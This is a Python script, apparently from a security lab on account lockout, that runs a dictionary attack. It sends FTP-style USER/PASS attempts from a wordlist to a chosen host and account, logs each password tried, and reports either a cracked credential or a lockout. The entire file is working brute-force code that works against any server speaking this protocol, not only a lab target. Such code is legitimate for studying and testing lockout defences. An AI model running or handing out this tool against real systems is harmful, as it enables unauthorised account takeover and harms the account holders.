"""Dictionary attack: many candidate passwords tried against one account."""
import argparse
import os
import socket
import time


def try_login(host, port, username, password, timeout=3.0):
    with socket.create_connection((host, port), timeout=timeout) as s:
        f = s.makefile("rwb", buffering=0)
        f.write(f"USER {username}\n".encode())
        f.readline()
        f.write(f"PASS {password}\n".encode())
        reply = f.readline().decode(errors="replace").strip()
    return reply


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--user", required=True)
    parser.add_argument("--wordlist", required=True)
    parser.add_argument("--log", default=os.path.join(os.path.dirname(__file__), "logs", "attacker_dict.log"))
    args = parser.parse_args()

    os.makedirs(os.path.dirname(args.log), exist_ok=True)
    logf = open(args.log, "a")

    with open(args.wordlist) as f:
        candidates = [line.strip() for line in f if line.strip()]

    start = time.time()
    for i, password in enumerate(candidates, 1):
        try:
            reply = try_login(args.host, args.port, args.user, password)
        except OSError as e:
            reply = f"ERROR {e}"
        elapsed = time.time() - start
        line = f"[{elapsed:7.3f}s] attempt={i} user={args.user} password={password!r} -> {reply}"
        print(line)
        logf.write(line + "\n")

        if reply.startswith("230"):
            print(f"\nSUCCESS: {args.user}:{password}  ({i} attempts, {elapsed:.2f}s)")
            logf.write(f"CRACKED user={args.user} password={password} attempts={i} time={elapsed:.2f}s\n")
            break
        if reply.startswith("503"):
            print(f"\nACCOUNT LOCKED after {i} attempts ({elapsed:.2f}s) - dictionary attack blocked")
            logf.write(f"LOCKED_OUT user={args.user} attempts={i} time={elapsed:.2f}s\n")
            break
    else:
        print(f"\nExhausted wordlist ({len(candidates)} words), no match.")

    logf.close()


if __name__ == "__main__":
    main()
